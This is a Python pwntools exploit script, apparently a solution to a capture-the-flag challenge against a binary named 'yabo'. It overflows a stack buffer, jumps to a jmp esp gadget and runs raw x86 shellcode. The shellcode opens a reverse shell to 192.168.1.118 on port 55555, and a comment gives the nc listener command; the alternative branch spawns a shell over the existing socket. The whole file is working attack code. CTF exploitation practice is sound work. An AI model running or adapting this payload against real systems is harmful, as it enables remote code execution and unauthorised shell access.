# Author: EdbR

import socket
from pwn import *
local = True
reverse_shell = True

if local:
    p = remote('localhost', 9999)
else:
    p = remote('challenge.ctf.games', 30829)

jmp_esp = 0x080492e2 # ROPgadget --binary yabo | grep -i ": jmp esp"

payload = b"A"*1044
payload += p32(jmp_esp)

# 1.Reverse Shell , nc -lv 192.168.1.118 55555

addr = socket.inet_aton("192.168.1.118")
port = p16(socket.htons(55555))

if(reverse_shell):
    shellcode = (b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2"+
                b"\x52\x53\x6a\x02\x89\xe1\xcd\x80"+
                b"\x92\xb0\x66\x68"+addr+
                b"\x66\x68"+port+b"\x43\x66\x53\x89"+
                b"\xe1\x6a\x10\x51\x52\x89\xe1\x43"+
                b"\xcd\x80\x6a\x02\x59\x87\xda\xb0"+
                b"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b"+
                b"\x41\x89\xca\x52\x68\x2f\x2f\x73"+
                b"\x68\x68\x2f\x62\x69\x6e\x89\xe3"+
                b"\xcd\x80")
    payload += (shellcode)

# 2.Duplicate file descriptor

else:
    shellcode = shellcraft.linux.dup2(4, 0)
    shellcode += shellcraft.linux.dup2(4, 1)
    shellcode += shellcraft.linux.dup2(4, 2)
    shellcode += shellcraft.linux.sh()
    payload += asm(shellcode)

p.sendlineafter(b"What would you like to say?:", payload)
p.interactive()